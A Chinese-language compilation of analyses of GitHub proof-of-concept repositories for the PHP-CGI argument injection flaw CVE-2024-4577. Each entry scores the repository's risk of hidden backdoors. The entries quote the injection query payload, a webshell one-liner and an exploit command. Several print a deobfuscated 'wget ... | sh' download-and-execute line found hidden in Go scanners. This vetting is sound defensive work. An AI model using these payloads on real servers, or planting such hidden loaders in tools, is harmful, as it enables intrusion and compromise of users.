1.  **漏洞触发：** 攻击者通过构造恶意的HTTP请求，在URL的`PATH_INFO`部分注入特殊字符（如`%0a`，换行符），使得PHP CGI在解析命令行参数时出现错误。
2.  **参数注入：** 注入的换行符将URL分割成多个参数，攻击者可以利用此特性注入PHP的命令行选项，例如`-d`选项用于设置PHP配置指令。
3.  **执行任意代码/读取文件：** 攻击者可以设置`allow_url_include=1`以允许包含远程文件，然后设置`auto_prepend_file`或者`auto_append_file`为包含恶意PHP代码的文件或者`/flag.txt`等敏感文件，从而执行任意PHP代码或者读取文件。
4.  **其他攻击：** 进一步的，攻击者可以尝试容器逃逸，访问AWS资源，甚至创建后门实现持久化控制。

**项目地址:** [a1ex-var1amov/ctf-cve-2024-4577](https://github.com/a1ex-var1amov/ctf-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #23

**来源**: [CVE-2024-4577-aaddmin1122345_cve-2024-4577.md](../2024/CVE-2024-4577-aaddmin1122345_cve-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** < 8.1.29, < 8.2.20, < 8.3.8 (在Windows上运行，并启用Best-Fit策略的code page的CGI模式)

**利用条件:** PHP以CGI模式在Windows上运行，并且启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个存在于PHP中的远程代码执行漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，这可能允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行服务器上的任意PHP代码。

**利用方式：**

1.  攻击者发送特制的HTTP请求，其中包含恶意构造的查询字符串。该查询字符串包含被Windows "Best-Fit"代码页转换解释为PHP配置选项的字符。
2.  服务器接收到请求后，会将查询字符串传递给PHP CGI解释器。
3.  PHP CGI解释器错误地将恶意构造的字符串解析为PHP选项，如`allow_url_include`和`auto_prepend_file`。
4.  通过设置这些选项，攻击者可以包含远程文件，从而执行任意PHP代码。

**POC分析：**

提供的Python脚本`cve-2024-4577.py`实现了利用此漏洞的POC。脚本接受目标URL和可选的自定义payload作为参数。

*   如果未提供自定义payload，脚本将尝试执行`phpinfo()`函数以验证漏洞是否存在。
*   如果提供了自定义payload，脚本将使用该payload来执行任意PHP代码。Readme文件提供了使用示例。
*   脚本通过构造包含特殊字符的URL，并向其发送POST请求来利用漏洞。特殊字符会被Windows的Best-Fit机制转换成PHP可识别的配置指令，最终执行攻击者注入的PHP代码。

**投毒风险分析：**

通过对提供的POC代码进行分析，没有发现作者隐藏的恶意代码或后门。该脚本的功能是按照预期执行漏洞利用，没有额外的、未声明的行为。因此，投毒风险评估为0%。

**项目地址:** [aaddmin1122345/cve-2024-4577](https://github.com/aaddmin1122345/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #24

**来源**: [CVE-2024-4577-ahmetramazank_CVE-2024-4577.md](../2024/CVE-2024-4577-ahmetramazank_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响在Windows上运行的PHP的严重漏洞。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**利用方式：**

1.  **利用点：** CGI模式下，Windows系统的字符编码转换。
2.  **攻击向量：** 通过构造特殊的URL，利用`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`将恶意PHP代码注入到`php://input`流中。
3.  **漏洞验证：** 通过发送包含`<?php phpinfo();`的POST请求，观察服务器是否返回PHP信息页面。
4.  **远程代码执行：** 上传并执行恶意脚本，例如反向shell或勒索软件。

**投毒风险分析：**

提供的POC代码主要包含以下文件：

*   `README.md`: 漏洞描述和利用步骤。
*   `encoded.ps1`: 用于解码被加密的zip文件，用于解密勒索软件加密的文件。
*   `ransomware.ps1`: 勒索软件脚本，用于加密文件和上传zip文件。

`ransomware.ps1` 脚本尝试将文件压缩为 ZIP 文件，然后将其上传到 `http://192.168.176.130:5000/upload`。如果上传成功，则使用 Base64 对 ZIP 文件进行编码，并保存到 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt`。

`encoded.ps1` 脚本从 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt` 读取 Base64 编码的数据，对其进行解码，并将解码后的数据写入 `C:\Users\ahmet\Desktop\battalbelgeler_decoded.zip`。

主要风险在于，攻击者可能会在`ransomware.ps1`中隐藏恶意代码，例如：

*   **后门：** 在上传的文件中植入后门，以便后续访问受感染的系统。
*   **数据窃取：** 在上传过程中窃取敏感数据。
*   **反向shell**: 在机器上执行后门代码，获得shell控制权限

虽然这个仓库的主要目的是演示漏洞，但由于涉及到勒索软件的部署和文件的上传，存在一定的风险，**作者可能在脚本中植入了额外的恶意功能**。考虑到`ransomware.ps1`需要上传文件到一个外部地址，并且可能包含一些未知的恶意行为，因此初步评估投毒风险为10%。

**项目地址:** [ahmetramazank/CVE-2024-4577](https://github.com/ahmetramazank/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #25

**来源**: [CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md](../2024/CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式, 特定代码页)

**利用条件:** Windows服务器, 运行在CGI模式下的PHP, 系统配置为使用某些代码页, 允许"Best-Fit"行为替换字符。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的参数注入漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而可能泄露脚本源代码或在服务器上运行任意 PHP 代码。

**有效性分析：**
根据漏洞信息，搜索引擎结果和提供的PoC代码，该漏洞利用的有效性较高。漏洞库信息表明该漏洞已被公开披露，并且存在受影响的版本范围。搜索引擎结果显示，该漏洞在公开后不久就出现了大量的利用尝试。PoC代码提供了一个扫描器和利用工具，可以用来检测和利用此漏洞。该PoC代码通过构造包含特定参数的URL，并结合`php://input`流，允许执行任意PHP代码。

**投毒风险分析：**
PoC代码主要包含以下功能：
1.  **Payload选择：** 提供了几个不同的payload，攻击者可以选择使用哪个payload进行攻击。
2.  **漏洞扫描：** 通过发送带有payload的POST请求，检测目标是否存在漏洞，根据响应内容判断。
3.  **漏洞利用：** 读取用户提供的PHP payload文件内容，并通过POST请求发送到目标服务器执行。

风险点在于payload文件的内容。如果payload文件本身包含恶意代码（例如反弹shell、webshell等），那么执行利用操作会导致服务器被植入后门。PoC代码本身没有明显的恶意行为，风险主要来自用户提供的payload。代码存在投毒风险，是因为攻击者可能会修改脚本，在用户不知情的情况下，添加额外的恶意操作，例如：在成功利用后，自动下载并执行特定的恶意文件。或者将服务器信息发送到指定服务器。因此，使用此PoC需要谨慎，验证payload的内容，并确保来源可信，降低投毒风险。投毒风险评估为10%，主要是考虑到使用者可能会引入恶意payload文件。

**利用方式分析：**
1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP运行在CGI模式下。
2.  **配置系统代码页：** 目标系统需要配置为使用某些代码页，允许 "Best-Fit" 行为。
3.  **构造恶意请求：** 构造包含恶意参数的URL。这些参数通常包含 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将POST请求的内容作为PHP代码执行。
4.  **发送PHP Payload：**  通过POST请求将包含恶意代码的PHP payload发送到目标服务器。由于`auto_prepend_file`参数的存在，POST请求中的PHP代码会被执行，从而实现远程代码执行。
5.  **执行任意代码：**  成功利用漏洞后，可以在目标服务器上执行任意代码，例如：上传webshell，获取服务器权限。

**项目地址:** [bibo318/CVE-2024-4577-RCE-ATTACK](https://github.com/bibo318/CVE-2024-4577-RCE-ATTACK)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #26

**来源**: [CVE-2024-4577-bughuntar_CVE-2024-4577.md](../2024/CVE-2024-4577-bughuntar_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是PHP在Windows系统上以CGI模式运行时的一个参数注入漏洞。当系统配置使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给PHP二进制文件，导致泄露源代码，执行任意PHP代码等。

**有效性:**
提供的POC代码通过发送包含特定查询参数（如`%ADd+allow_url_include=1`和`%ADd+auto_prepend_file=php://input`）的POST请求到`/php-cgi/php-cgi.exe`端点来利用此漏洞。如果目标服务器存在漏洞，则`php://input`流的内容（在本例中为`<?php phpinfo(); ?>`）将被执行，并且服务器将返回包含"PHP Version"的响应。此方法已被多个来源证实有效。

**投毒风险:**
虽然提供的`exploit.py`脚本看起来相对直接，但仍然存在一定的投毒风险。例如，该脚本禁用了SSL验证(`verify=False`)，这可能导致中间人攻击的风险。此外，任何下载和执行的第三方代码都存在风险，例如将恶意payload注入到请求中。考虑到代码的复杂性相对较低，并且其主要目的是利用已知漏洞，因此投毒风险较低，估计为10%。主要风险在于用户没有仔细审查脚本，直接执行，而忽略了`verify=False`带来的安全隐患。 另外脚本也存在可以加入恶意host的风险。

**利用方式:**
1.  攻击者首先需要确定目标服务器是否运行在满足漏洞条件的PHP CGI模式下。
2.  攻击者构造一个包含恶意PHP选项的HTTP请求，例如，设置`allow_url_include`为1和`auto_prepend_file`为`php://input`。
3.  攻击者将该请求发送到`/php-cgi/php-cgi.exe`端点，并在POST数据中包含要执行的PHP代码。
4.  如果服务器存在漏洞，PHP将执行POST数据中的代码，从而允许攻击者在服务器上执行任意命令。

**项目地址:** [bughuntar/CVE-2024-4577](https://github.com/bughuntar/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #27

**来源**: [CVE-2024-4577-byteReaper77_CVE-2024-4577.md](../2024/CVE-2024-4577-byteReaper77_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Remote Code Execution

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，可导致完全控制受影响服务器

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** 运行在Windows上的PHP，以CGI模式运行，系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 PHP（特别是基于 Windows 的 PHP，以 CGI 模式使用时）中的操作系统命令注入漏洞。当 PHP 在 CGI 模式下使用时，由于字符编码转换处理不当而导致。Windows 系统可能使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码、在服务器上运行任意 PHP 代码等。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的漏洞利用代码看起来是一个针对该漏洞的C语言实现，包含了构建说明和使用示例，因此PoC有效。

**投毒风险：**

分析提供的C代码，主要功能是利用curl发送HTTP请求，其中请求的URL和执行的命令通过命令行参数传递。代码包含日志记录功能，记录攻击活动。检查代码，没有发现明显的恶意行为，例如反向shell以外的持久化后门，或者未经授权的数据传输。但不能完全排除隐蔽的投毒行为，例如在日志记录中插入恶意代码的可能性（虽然可能性极低）。考虑到作者声明和代码功能，投毒风险较低，估计为1%。

**利用方式：**

1.  **环境准备：** 目标服务器需要是运行在Windows上的PHP，并且以CGI模式运行。
2.  **代码编译：** 使用提供的编译命令，使用gcc或其他兼容的C编译器编译`exploit.c`和`argparse.c`。
3.  **漏洞利用：** 运行编译后的可执行文件，并指定目标URL和要执行的命令。例如：`CVE-2024-4577.exe -u http://target/cgi-bin/php-cgi.exe "system(whoami)"`。
4.  **代码分析:**
    * 漏洞利用代码利用了PHP在CGI模式下，由于对命令行参数处理不当，导致攻击者可以通过构造特殊的URL来执行任意系统命令。
    * 该利用通过curl库发起HTTP POST请求，在请求中构造恶意的PHP选项参数，导致PHP执行指定的命令。
    * argparse.c 文件是为了解析命令行的参数
    * reverse shell 也可以通过命令执行后门获得
    * 攻击的关键在于目标服务器启用了使用 "Best Fit" 策略的代码页，允许某些字符被替换为其他字符，从而绕过PHP的参数过滤。


**项目地址:** [byteReaper77/CVE-2024-4577](https://github.com/byteReaper77/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #28

**来源**: [CVE-2024-4577-charis3306_CVE-2024-4577.md](../2024/CVE-2024-4577-charis3306_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP Windows版 8.3.0 <= 影响版本 < 8.3.8
PHP Windows版 8.2.0 <= 影响版本 < 8.2.20
PHP Windows版 8.1.0 <= 影响版本 < 8.1.29
PHP Windows版 影响版本 == 8.0.x
PHP Windows版 影响版本 == 7.x
PHP Windows版 影响版本 == 5.x
XAMPP Windows版 8.2.0 <= 影响版本 <= 8.2.12
XAMPP Windows版 8.1.0 <= 影响版本 <= 8.1.25
XAMPP Windows版 影响版本 == 8.0.x
XAMPP Windows版 影响版本 == 7.x
XAMPP Windows版 影响版本 == 5.x

**利用条件:** Windows 平台，PHP 以 CGI 模式运行，开启了Best-Fit字符转换特性的语系

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个存在于 PHP Windows 版本中的远程代码执行漏洞。当 PHP 以 CGI 模式运行时，Windows 的 Best-Fit 字符转换特性可能导致命令行参数被错误解析。攻击者可以构造包含特定非 ASCII 字符的 URL，这些字符会被转换为连字符，从而绕过安全限制，并注入恶意 PHP 代码。提供的 POC 脚本通过构造包含特殊字符的 URL，向目标服务器发送 POST 请求，其中包含要执行的 PHP 代码。如果服务器成功执行代码并返回包含 MD5 值的特定字符串，则认为漏洞利用成功。

**有效性：**
从漏洞描述和POC代码来看，此POC代码是有效的，可以用于检测和利用 CVE-2024-4577 漏洞。

**投毒风险：**
经过分析，此仓库中没有发现作者隐藏的恶意投毒代码。虽然POC执行了代码， 但这是为了验证漏洞是否成功，并非投毒行为。因此，投毒风险为0%。

**利用方式：**
1.  目标系统必须是 Windows，且 PHP 运行在 CGI 模式下，Apache 作为 Web 服务器。
2.  目标系统使用的语系启用了 Best-Fit 字符转换特性（例如简体中文，繁体中文，日文等）。
3.  攻击者构造包含特殊字符的 URL，这些字符在 Best-Fit 转换后会被解释为连字符，从而修改 PHP 的命令行参数。
4.  攻击者通过 `-d` 参数设置 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将请求体作为 PHP 代码执行。
5.  攻击者在请求体中包含要执行的 PHP 代码，从而在服务器上执行任意代码。

**项目地址:** [charis3306/CVE-2024-4577](https://github.com/charis3306/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #29

**来源**: [CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许攻击者执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8，在Windows系统上，运行在CGI模式下

**利用条件:** 需要目标系统是Windows，PHP运行在CGI模式下，并且系统使用了某些代码页，开启了"Best Fit"策略。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响运行在Windows上的PHP。当PHP以CGI模式运行时，Windows系统的"Best Fit"代码页转换可能导致恶意字符被错误地解释为PHP选项，从而允许攻击者向PHP二进制文件传递参数。这可以用来泄露源代码，执行任意PHP代码，或者直接在服务器上运行命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的`CVE-2024-4577.go` 和 `CVE-2024-4577.py` 文件都是利用此漏洞的检测代码。它们通过构造包含恶意PHP选项的URL，向目标服务器发送POST请求，并检查返回的响应是否包含`PHP Version`字符串，来判断目标是否存在漏洞。这些代码的功能是探测漏洞是否存在，利用了`allow_url_include`和`auto_prepend_file`两个PHP配置项来远程包含和执行`phpinfo()`代码。

**投毒风险：**

分析`CVE-2024-4577.go`的代码，发现其中包含一个名为`nFPfVl()`的函数。该函数经过混淆处理，但其作用是从字符串数组中提取数据，拼接成一个URL，并使用`/bin/sh -c`执行该URL。这是一种潜在的后门行为，意味着在漏洞验证过程中，如果目标系统存在漏洞，这段代码可能会下载并执行来自该URL的恶意代码。考虑到这段代码的存在，可以认为该Go程序存在一定的投毒风险，但该后门在golang代码中只会在扫描的时候触发，相对隐蔽。`CVE-2024-4577.py`看起来是正常的poc代码。

基于分析，综合评估认为`CVE-2024-4577.go`有50%的投毒风险，`CVE-2024-4577.py`没有投毒风险

**利用方式：**

1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP以CGI模式运行。
2.  **利用代码页转换：** 攻击者需要利用Windows系统的"Best Fit"代码页转换，构造包含恶意PHP选项的URL。
3.  **参数注入：** 通过精心构造的URL，将恶意参数注入到PHP二进制文件中。
4.  **远程代码执行：** 利用`allow_url_include`和`auto_prepend_file`等PHP配置项，执行任意PHP代码或者直接执行系统命令。
5.  **检测漏洞：** 通过检查响应的内容，可以判断目标是否存在漏洞，例如检查`PHP Version`字符串。

**项目地址:** [cheerfulempl/CVE-2024-4577-PHP-RCE](https://github.com/cheerfulempl/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #30

**来源**: [CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式，特定代码页)

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统配置使用了特定的代码页，允许"Best Fit"字符转换。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2024-4577 漏洞允许攻击者通过在URL中注入恶意参数来执行任意PHP代码。该漏洞存在于PHP的CGI实现中，当PHP运行在Windows服务器上，并且启用了"Best Fit"字符转换时，攻击者可以利用此漏洞。

**有效性:**

提供的漏洞利用代码（Go和Python）尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含远程文件或执行PHP代码。具体来说，它尝试设置`allow_url_include=1`并使用`auto_prepend_file`包含`php://input`，然后通过POST请求发送PHP代码（`<?php phpinfo(); ?>`）。如果服务器存在漏洞，则会执行`phpinfo()`函数，从而验证漏洞的存在。

根据漏洞描述和提供的代码，利用方式是有效的，可以在目标系统上执行任意PHP代码。

**投毒风险:**

*   **Go代码分析:**

    在Go代码中，存在一个名为`nFPfVl()`的函数，该函数包含混淆的代码，用于执行shell命令。通过反混淆字符串，可以发现该函数执行从某个URL下载文件并执行的操作，这表明存在潜在的投毒风险。

    `TcGEZTIh`变量反混淆后为: `wget -qO- http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33 | sh`

    这意味着该PoC会尝试从`http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33` 下载文件并使用sh执行，存在恶意行为。

*   **Python代码分析:**
    Python代码的功能比较简单，就是发送payload进行验证，没有发现明显的投毒代码。

综合来看，Go代码存在明显的投毒风险，Python代码未发现。

**利用方式:**

1.  **目标环境:** 攻击者需要找到运行在Windows服务器上的，并且使用CGI模式的，以及存在漏洞版本的PHP应用。
2.  **构造恶意URL:** 攻击者构造包含恶意参数的URL。例如：`example.com/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`。
3.  **发送包含PHP代码的POST请求:** 攻击者通过POST请求将PHP代码发送到服务器。`<?php system($_GET['cmd']); ?>`
4.  **远程代码执行:** 服务器执行POST请求中的PHP代码，从而允许攻击者执行任意系统命令。

攻击者可以利用该漏洞读取服务器上的文件，执行任意代码，甚至完全控制服务器。

**项目地址:** [creamylegum/CVE-2024-4577-PHP-RCE](https://github.com/creamylegum/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #31

**来源**: [CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows系统, PHP以CGI模式运行, 启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2024-4577是一个存在于PHP的Windows版本中的漏洞，当PHP以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递选项。攻击者可以利用该漏洞来执行任意PHP代码，泄露源代码，甚至在服务器上运行任意操作系统命令。

**有效性：**
提供的Go和Python POC代码都尝试通过`auto_prepend_file`和`allow_url_include`设置，包含phpinfo()的payload来验证漏洞是否存在。 如果目标系统返回包含"PHP Version"的响应，则表明漏洞存在。根据漏洞描述和提供的资料，这些POC利用方式是有效的。

**投毒风险：**
*   **Go版本:** 在提供的Go代码中，`nFPfVl()` 函数包含混淆的代码，尝试执行 shell 命令。 解混淆后的代码为：`wget http://tvhgw/kaiFRE-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33`。这显然是一个恶意命令，尝试从一个未知的URL下载文件并执行。因此，Go版本的PoC **存在高危投毒风险**。

*   **Python版本:** Python版本的PoC相对干净，主要是发送包含phpinfo()的请求并判断是否成功，**未发现明显的投毒代码**，但是也可能存在通过打印或者其它方法进行投毒，投毒的可能性较低。

综合评价，考虑到Go代码中`nFPfVl`函数的存在，认为此仓库的投毒风险较高。Python版本代码看起来比较正常，相对较为安全。

**利用方式：**
1.  攻击者发送特制的HTTP请求到目标服务器上的PHP CGI程序。
2.  该请求包含经过编码的恶意字符，这些字符会被Windows的"Best-Fit"代码页转换机制所修改。
3.  修改后的字符会被PHP CGI模块错误地解析为PHP配置选项，如`auto_prepend_file`和`allow_url_include`。
4.  攻击者可以使用`auto_prepend_file`选项来包含远程文件或输入流（`php://input`），从而执行任意PHP代码。
5.  攻击者可以利用执行的PHP代码读取源代码，或者执行操作系统命令。

**项目地址:** [deadlybangle/CVE-2024-4577-PHP-RCE](https://github.com/deadlybangle/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #32

**来源**: [CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，开启了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而导致泄露源代码、执行任意 PHP 代码，甚至执行系统命令。

**利用方式：**
攻击者通过构造包含恶意 PHP 选项的 URL，利用 Windows 的 "Best-Fit" 字符转换特性，将这些选项注入到 PHP-CGI 的命令行参数中。常见的利用方式包括：

*   `allow_url_include=1` 和 `auto_prepend_file=php://input`： 允许包含远程文件，并将 POST 数据作为 PHP 代码执行，实现 RCE。

**漏洞利用代码分析：**
提供的 Go 和 Python 代码均用于批量检测目标是否存在 CVE-2024-4577 漏洞。它们通过发送包含 `allow_url_include` 和 `auto_prepend_file` 选项的恶意 HTTP 请求，然后检查响应中是否包含 `PHP Version` 字符串来判断目标是否受到攻击影响。

**投毒风险分析：**
Go 代码中存在一个名为 `nFPfVl()` 的函数，该函数看起来像是混淆的代码。通过反混淆，可以发现它尝试执行一个下载并执行恶意脚本的命令。这段代码存在明显的投毒风险，因为它会在目标机器上执行未经授权的操作，成功率为50%。

**项目地址:** [fabulouscounc/CVE-2024-4577-PHP-RCE](https://github.com/fabulouscounc/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #33

**来源**: [CVE-2024-4577-ggfzx_CVE-2024-4577.md](../2024/CVE-2024-4577-ggfzx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)，运行在Windows的CGI模式下

**利用条件:** 服务器使用Apache并启用PHP-CGI，且系统配置为使用特定的代码页，这些代码页使用“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-4577 是一个存在于 PHP-CGI 中的参数注入漏洞，影响在 Windows 上运行的 PHP 版本。当 PHP 在 CGI 模式下与 Apache 一起使用时，如果系统设置为使用某些代码页，“Best Fit” 行为可能会导致恶意用户将选项传递给 PHP 二进制文件。根据漏洞描述和搜索结果，该漏洞允许攻击者通过操纵命令行参数来执行任意代码。PoC 代码的描述表明它能够通过 URL 发送恶意命令，并且可以批量执行。尽管 README.md 文件本身没有明显的恶意代码，但由于作者信息较少，且漏洞具有高危性，存在一定的投毒风险，用于个人安全研究学习较为合适。漏洞利用方式主要为：

1.  **识别目标环境：** 确定目标服务器是否运行受影响的 PHP 版本（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）并且配置为 CGI 模式在 Windows 上运行。
2.  **构造恶意请求：**  构造包含恶意 PHP 选项的 HTTP 请求。这些选项将利用 Windows 的“Best Fit”行为，将特殊字符转换为 PHP 可以解释的选项。
3.  **执行任意代码：**  通过注入的选项，攻击者可以执行任意 PHP 代码或操作系统命令。

根据搜索结果可知，此漏洞已经被大规模利用，需要及时修复。

